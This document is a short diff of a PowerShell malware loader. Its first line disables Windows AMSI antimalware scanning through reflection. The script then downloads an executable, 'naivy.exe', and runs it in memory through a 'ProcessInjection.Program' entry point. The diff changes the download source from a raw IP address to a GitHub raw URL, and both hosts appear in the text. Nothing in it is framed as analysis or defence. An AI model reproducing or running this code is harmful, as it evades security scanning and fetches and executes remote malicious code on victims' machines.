@@ -1,7 +1,7 @@
 
 $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
 
-$data = (Invoke-WebRequest -UseBasicParsing "http://193.149.176.124/naivy.exe").Content;
+$data = (Invoke-WebRequest -UseBasicParsing "https://raw.githubusercontent.com/lupeforany/dopp/main/naivy.exe").Content;
 $assembly = [System.Reflection.Assembly]::Load($data);
 $entryPointMethod = $assembly.GetType('ProcessInjection.Program', [Reflection.BindingFlags] 'Public, NonPublic, Static').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
 $entryPointMethod.Invoke($null, (, [string[]] ('', '')));
